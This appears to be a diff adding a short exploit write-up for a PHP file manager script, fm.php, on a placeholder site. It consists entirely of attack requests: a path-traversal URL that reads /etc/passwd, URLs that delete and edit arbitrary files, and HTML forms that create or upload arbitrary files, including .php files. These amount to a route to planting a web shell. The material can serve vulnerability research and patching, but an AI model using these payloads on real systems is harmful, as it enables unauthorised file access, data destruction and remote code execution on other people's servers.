@@ -1,0 +1,34 @@
+Reading of arbitrary files:
+http://www.site.com/file/fm.php?action=download&amp;filename=../../../../../../etc/passwd&amp;pathext=&amp;u=&amp;&amp;copt=1&amp;sortKey=2
+
+Deletion of arbitrary files:
+http://www.site.com/file/fm.php?delete=phpshell.php&amp;copt=1&amp;sortKey=2&amp;u=&amp;pathext= 
+
+Editing of arbitrary files:
+http://www.site.com/file/fm.php?edit=../index.php&amp;u=&amp;copt=1&amp;pathext= 
+
+Creation of arbitrary files:
+&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;http://www.site.com/file/fm.php&quot;&gt;
+ &lt;center&gt;Filename: &lt;input type=&quot;text&quot; name=&quot;newfilename&quot;&gt;
+ &lt;select class=altButton name=&quot;newfileext&quot;&gt;
+ &lt;option&gt;.txt&lt;/option&gt;&lt;option&gt;.html&lt;/option&gt;&lt;option&gt;.php&lt;/option&gt;
+ &lt;/select&gt;
+ &lt;textarea name=&quot;newcontent&quot; cols=&quot;60&quot; rows=&quot;15&quot;&gt;&lt;/textarea&gt;
+ &lt;input type=&quot;hidden&quot; name=&quot;copt&quot; value=&quot;1&quot;&gt;
+ &lt;input type=&quot;submit&quot; name=&quot;savenew&quot; value=&quot;Save&quot;&gt;
+ &lt;input type=&quot;hidden&quot; name=&quot;u&quot; value=&quot;&quot;&gt;
+ &lt;input type=&quot;hidden&quot; name=&quot;pathext&quot; value=&quot;/&quot;&gt;
+ &lt;input type=&quot;hidden&quot; name=sortKey value=&quot;2&quot;&gt;
+ &lt;/center&gt;
+ &lt;/form&gt;
+
+Uploading of arbitrary files:
+&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;http://www.site.com/file/fm.php&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;104857600&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;copt&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;file&quot; name=&quot;uploadedfile&quot;&gt;
+&lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;Upload&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;u&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;pathext&quot; value=&quot;/&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=sortKey value=&quot;2&quot;&gt;
+&lt;/form&gt;
